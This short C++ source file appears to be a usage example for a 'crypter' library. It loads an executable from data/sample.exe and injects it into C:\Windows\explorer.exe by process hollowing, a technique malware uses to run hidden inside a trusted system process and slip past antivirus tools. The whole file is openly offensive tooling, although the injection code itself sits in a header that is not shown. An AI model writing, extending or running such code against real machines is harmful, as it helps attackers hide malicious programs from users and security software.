/**
 * example_inject.cpp
 **/

#include "crypter.hpp"

int main(int argc, char **argv)
{
    /* read pe data into memory */
    crypter::pe_data_t pe;
    crypter::init(&pe, "data/sample.exe");

    /* inject pe via process hollowing */
    crypter::inject(&pe, "C:\\Windows\\explorer.exe");

    crypter::free(&pe);
    return 0;
}